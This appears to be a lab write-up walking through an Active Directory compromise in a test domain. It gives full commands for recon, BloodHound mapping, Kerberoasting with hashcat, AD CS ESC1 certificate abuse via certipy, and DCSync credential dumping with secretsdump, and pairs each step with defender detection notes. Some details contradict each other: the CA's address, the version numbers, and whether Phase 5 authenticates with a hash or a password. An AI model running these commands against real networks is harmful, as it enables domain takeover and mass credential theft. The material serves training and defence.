# Zero Credentials to Domain Admin: A Full Attack Chain Walkthrough

**Lab:** Active Directory Pentest Lab (`labs/security/active-directory/base/`)
**Lab version:** 1.9
**Network:** 172.28.128.0/24 (`lab.local`)
**Full reference:** See [`attack-guide.md`](../../../labs/security/active-directory/base/docs/attack-guide.md) for comprehensive technique coverage and alternative attack paths.

This is a narrative walkthrough of one complete path from an unauthenticated
foothold to Domain Admin, using nothing but the credentials and access
recovered at each prior step. It's meant to read like an engagement report:
what was run, what came back, why it mattered, and what it would look like
to a defender watching the same traffic.

For the full technique reference (every path, not just this one), see
[`attack-guide.md`](../../../labs/security/active-directory/base/docs/attack-guide.md).
For blue-team detections mapped to these exact techniques, see
[`ad-mitre-log-source-playbook.md`](ad-mitre-log-source-playbook.md).

> This lab is for authorized learning and skill development only. Every
> credential below is a disposable lab credential — never reuse lab
> passwords, hashes, or certificates outside this environment.

---

## The environment

Eleven hosts, one domain, `lab.local`:

| Host | IP | OS | Role |
|------|----|----|------|
| kali | 172.28.128.10 | Kali Linux | Attacker box (your position) |
| metasploitable2 | 172.28.128.12 | Ubuntu 8.04 | Legacy vulnerable target |
| juice-shop | 172.28.128.15 | Node.js | OWASP Juice Shop |
| dc01 | 172.28.128.21 | Windows Server 2022 | Domain Controller |
| db01 | 172.28.128.23 | Windows Server 2022 | SQL Server *(simulated)* |
| ca01-esc | 172.28.128.25 | Windows Server 2022 | AD CS — misconfigured |
| win10 | 172.28.128.30 | Windows 10 | Domain workstation |
| llm01 | 172.28.128.60 | Ubuntu 22.04 | LLM platform |
| linux01 | 172.28.128.72 | Ubuntu 22.04 | Linux domain member |
| print01 | 172.28.128.73 | Windows Server 2022 | Print Server |
| cloud-pentest | 172.28.128.80 | Ubuntu 22.04 | LocalStack AWS simulation |

> **Note:** `db01` is a simulated target — a domain-joined Windows Server 2022
> host with product-like config files and weak settings for post-exploitation
> practice, not a full SQL Server installation.
>
> **Removed in v1.11:** `exch01` (Exchange), `sp01` (SharePoint), and
> `pnpt-internal` were retired and are no longer deployed.

**Starting position:** no domain credentials, only network access from kali.
**Attack chain focus:** dc01, ca01-esc, and win10.

---

## Phase 1 — Recon: find out what's actually alive

```bash
# Host sweep
nmap -sn 172.28.128.0/24 -oN ~/lab/recon/hosts.txt

# Service discovery on key hosts and full scan of DC
nmap -sV -sC -T4 --top-ports 500 172.28.128.0/24 -oN ~/lab/recon/services.txt
nmap -p- --min-rate 2000 172.28.128.21 -oN ~/lab/recon/dc01_full.txt

# Enumerate SMB and DNS
nxc smb 172.28.128.0/24 --gen-relay-list ~/lab/recon/relay_targets.txt
dig axfr @172.28.128.21 lab.local | tee ~/lab/recon/dns_zonetransfer.txt
dnsrecon -d lab.local -n 172.28.128.21 -a -z -o ~/lab/recon/dnsrecon.txt
```

The host sweep confirms the domain controller at `.21` and the CA at `.24`.
A DNS zone transfer attempt against `dc01` is free reconnaissance if it's
allowed — it hands over the entire internal namespace without a single
credential. (In this lab it's intentionally permitted; a hardened DC would
refuse it.)

**What a defender would see:** a single source IP sweeping the full /24
followed by a zone transfer request is loud and specific — Zeek or Suricata
signatures for AXFR outside of secondary-DNS pairs should fire here.

---

## Phase 2 — Map the domain before touching anything sensitive

With nothing but the built-in `vagrant` account (a low-privilege domain
account seeded into this lab), pull the entire AD graph:

```bash
bloodhound-python \
  -u vagrant \
  -p Vagrant123! \
  -d lab.local \
  -dc 172.28.128.21 \
  -ns 172.28.128.21 \
  -c All \
  -o ~/lab/recon/bloodhound/

# Load the output into BloodHound Neo4j instance to visualize paths
```

Loading this into BloodHound surfaces the same thing a real assessment
would look for first: which low-privilege accounts have a graph path to
Domain Admins, and which certificate templates are enrollable by low-priv
users. In this lab, that path runs through Kerberoastable service accounts
and a vulnerable AD CS template — which is exactly what the next two phases
go after.

**Why this step matters for the portfolio, not just the attack:** this is
the step that separates "ran some tools" from "did an assessment." Everything
after this is targeted, not sprayed.

---

## Phase 3 — Credential access: Kerberoasting

Any authenticated user can request a service ticket for any account with a
Service Principal Name (SPN) — and that ticket is encrypted with the
service account's own password hash, which can be cracked offline with no
further contact against the DC.

```bash
# Request all Kerberoastable service tickets
GetUserSPNs.py lab.local/vagrant:Vagrant123! \
  -dc-ip 172.28.128.21 \
  -request \
  -outputfile ~/lab/creds/kerberoast.hashes

# Crack the hashes offline (or target the specific account)
hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  /usr/share/wordlists/rockyou.txt \
  -o ~/lab/creds/kerberoast_cracked.txt
```

This recovers `svc_kerberoast`'s password: `ServiceP@ss2`. It's a service
account, not an admin — but it's a credential that BloodHound already
flagged as having a path forward, which is why it was worth targeting
instead of just cracking whatever ticket came back first.

> **Note:** this lab seeds `ServiceP@ss2` as `svc_kerberoast`'s password on
> purpose (see `docs/lab-credentials.md`) so the technique is reproducible
> without depending on wordlist luck. In a real assessment, the value here
> would come from whatever `hashcat -m 13100` actually cracks — the command
> above is real, the output is fixed for repeatability.

**What a defender would see:** a spike in TGS-REQ (Kerberos service ticket
request) events for accounts with SPNs, especially many requests in a short
window from one workstation — Event ID 4769 with RC4 encryption
(`0x17`) is the classic tell, since modern accounts should be using AES.

---

## Phase 4 — Privilege escalation: AD CS ESC1

The CA at `ca01-esc` publishes a certificate template (`VulnESC1`) that lets
a low-privilege enrollee specify an arbitrary Subject Alternative Name —
meaning any domain user can request a certificate *as if they were the
Administrator account*, and AD CS will happily sign it. Now that we have
`svc_kerberoast`'s credentials, we can use them for this escalation:

```bash
# Enumerate vulnerable templates on ca01-esc
certipy find \
  -u svc_kerberoast@lab.local \
  -p 'ServiceP@ss2' \
  -dc-ip 172.28.128.21 \
  -vulnerable \
  -stdout | tee ~/lab/adcs/vulnerable_templates.txt

# Request a cert for Administrator using the VulnESC1 template
certipy req \
  -u svc_kerberoast@lab.local \
  -p 'ServiceP@ss2' \
  -target ca01-esc.lab.local \
  -ca LAB-ENTERPRISE-CA \
  -template VulnESC1 \
  -upn administrator@lab.local \
  -out ~/lab/adcs/esc1_admin.pfx

# Authenticate as Administrator using the cert to get their NT hash
certipy auth \
  -pfx ~/lab/adcs/esc1_admin.pfx \
  -dc-ip 172.28.128.21
```

`certipy auth` uses the resulting certificate to authenticate over PKINIT
and hands back the NT hash for the domain Administrator account. This is
the actual privilege escalation moment: a Kerberoasted service account
credential just turned into Domain Admin, without ever touching a
memory-resident credential on a domain controller.

**What a defender would see:** certificate issuance for a UPN that doesn't
match the requesting account is the specific, reliable signal here — most
environments never audit AD CS issuance logs closely enough to catch it,
which is exactly why ESC1 remains common in real assessments years after it
was first published.

---

## Phase 5 — Domain compromise: DCSync

With Administrator's NT hash in hand, pull every credential in the domain
directly from `dc01` by abusing replication permissions:

```bash
# Pull all domain secrets using Administrator's hash
secretsdump.py \
  'lab.local/administrator:Passw0rd!'@172.28.128.21

# Or output to a file for analysis, NTLM hashes only
secretsdump.py \
  'lab.local/administrator:Passw0rd!'@172.28.128.21 \
  -just-dc-ntlm \
  -outputfile ~/lab/loot/dcsync.hashes

# Extract the krbtgt hash (Kerberos master key)
grep krbtgt ~/lab/loot/dcsync.hashes
```

The `krbtgt` hash is the one that matters most — it's what makes a Golden
Ticket possible: a forged Kerberos TGT that authenticates as any user,
including one that doesn't exist, and remains valid until the `krbtgt`
account's password is rotated (twice, since AD keeps the previous
password valid for compatibility).

**What a defender would see:** DCSync abuses legitimate AD replication
(`DS-Replication-Get-Changes-All`), so it doesn't look like malware — it
looks like a domain controller talking to another domain controller. The
tell is the *source*: a workstation or member server invoking replication
rights that only DCs should ever use. Event ID 4662 with the replication
GUIDs, from a non-DC source, is the signature to alert on.

---

## What this chain demonstrates

| Step | Technique | MITRE ATT&CK |
|------|-----------|--------------|
| Recon | Zone transfer, host/service sweep | T1590, T1595 |
| Enumeration | BloodHound collection | T1087, T1482 |
| Credential access | Kerberoasting | T1558.003 |
| Privilege escalation | AD CS ESC1 | T1649 |
| Domain compromise | DCSync | T1003.006 |

Five steps, one unauthenticated starting point, zero interactive logons to
the domain controller, zero malware. This is also the realistic shape of a
real-world AD compromise — which is the point of building the lab this way
rather than just handing out Domain Admin credentials on day one.

---

## Reset the lab

```bash
cd labs/security/active-directory/base
vagrant destroy -f && vagrant up
```

See [`attack-guide.md`](../../../labs/security/active-directory/base/docs/attack-guide.md#14-lab-reset)
for a lighter-weight artifact cleanup that doesn't require rebuilding every VM.
